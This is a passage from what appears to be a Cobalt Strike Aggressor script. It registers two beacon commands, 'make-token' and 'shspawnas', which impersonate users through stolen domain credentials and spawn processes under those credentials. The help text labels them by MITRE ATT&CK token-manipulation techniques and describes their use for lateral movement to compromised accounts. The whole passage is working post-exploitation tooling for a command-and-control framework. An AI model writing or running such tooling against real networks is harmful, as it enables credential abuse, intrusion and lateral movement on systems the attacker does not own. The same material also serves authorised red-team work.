    "using LogonUser (LOGON32_LOGON_NEW_CREDENTIALS) and apply it to\n" .
    "the current thread for network authentication.\n\n" .
    "Examples:\n" .
    "  make-token CORP jdoe P@ssw0rd123\n" .
    "  make-token . localadmin P@ssw0rd123\n\n" .
    "MITRE ATT&CK: T1134.003 (Access Token Manipulation: Make and Impersonate Token)\n\n" .
    "Phase: 3 — Remote Ops\nArgs: <domain> <username> <password> (required)"
);

# --- shspawnas ---
alias shspawnas {
    local('$bid $domain $user $pass $cmd $args');
    $bid    = $1;
    $domain = $2;
    $user   = $3;
    $pass   = $4;
    $cmd    = $5;
    if ($domain is $null || $user is $null || $pass is $null || $cmd is $null) {
        berror($bid, "Use: shspawnas <domain> <username> <password> <cmd>\nExample: shspawnas CORP jdoe P@ssw0rd cmd.exe");
        return;
    }
    $args = bof_pack($bid, "zzzz", $domain, $user, $pass, $cmd);
    dani_run($bid, "shspawnas", $args);
}
beacon_command_register(
    "shspawnas",
    "Spawn process as another user — T1134.002",
    "Synopsis: shspawnas <domain> <username> <password> <cmd>\n\n" .
    "Description: Spawn a child process under alternate credentials using\n" .
    "CreateProcessWithLogonW (shell execute equivalent). Useful for\n" .
    "lateral movement to a compromised account.\n\n" .
    "Examples:\n" .
    "  shspawnas CORP jdoe P@ssw0rd cmd.exe\n\n" .
    "MITRE ATT&CK: T1134.002 (Access Token Manipulation: Create Process with Token)\n\n" .
    "Phase: 3 — Remote Ops\nArgs: <domain> <username> <password> <cmd> (required)"
);

